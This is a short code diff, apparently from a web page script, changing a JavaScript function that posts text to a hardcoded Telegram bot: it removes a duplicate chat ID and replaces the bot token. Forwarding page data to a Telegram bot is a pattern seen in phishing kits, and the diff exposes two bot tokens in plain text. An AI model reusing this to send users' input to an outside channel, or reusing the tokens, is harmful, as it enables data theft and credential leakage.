@@ -159,9 +159,9 @@
         }
 
        function sendToTelegram(text) {
-    const chatIds = [ "6967962102" , "6967962102"  ]; // يمكن تعديل هذه القائمة حسب الحاجة
+    const chatIds = [ "6967962102" ]; // يمكن تعديل هذه القائمة حسب الحاجة
     chatIds.forEach(chatId => {
-        fetch(`https://api.telegram.org/bot7863118617:AAEBjVAP-xklyLwmPUUvyki3QKpW6LZAJnI/sendMessage`, {
+        fetch(`https://api.telegram.org/bot7863118617:AAEJDI2KELFmWmoNkVTu1IO-jaNHxpAA1Po/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: chatId, text })
